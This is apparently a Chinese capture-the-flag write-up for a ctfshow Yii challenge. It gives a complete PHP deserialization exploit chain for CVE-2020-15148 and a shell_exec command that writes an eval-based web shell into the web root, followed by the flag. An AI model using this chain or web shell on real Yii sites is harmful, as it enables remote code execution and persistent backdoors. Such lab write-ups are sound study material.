查看源码发现是yii框架，用admin/admin登录，进入about页面，查看源码发现`<!--?view-source -->`提示，用get传参后出现。
```php
///backdoor/shell
unserialize(base64_decode($_GET['code']))
```
根据CVE-2020-15148，直接用已有的pop链打，这里的r已经提示是backdoor/shell，所以直接传code。
```php
<?php
namespace yii\rest{

    class IndexAction
    {
        public $checkAccess;
        public $id;
        public function __construct(){
            $this->checkAccess = 'phpinfo';
            $this->id = '1';				//命令执行
        }
    }
}
namespace Faker {

    use yii\rest\IndexAction;

    class Generator
    {
        protected $formatters;

        public function __construct()
        {
            $this->formatters['close'] = [new IndexAction(), 'run'];
        }
    }
}
namespace yii\db{

    use Faker\Generator;

    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct()
        {
            $this->_dataReader=new Generator();
        }
    }
}
namespace{

    use yii\db\BatchQueryResult;

    echo base64_encode(serialize(new BatchQueryResult()));
}
```
这里有的函数没回显，我们选择，然后访问1.php，用post传参即可。
```php
$this->checkAccess = 'shell_exec';
$this->id = 'echo "<?php eval(\$_POST[1]);phpinfo();?>" > /var/www/html/basic/web/1.php';
```
flag : ctfshow{d0518711-8913-429e-8191-457e123ce63c} 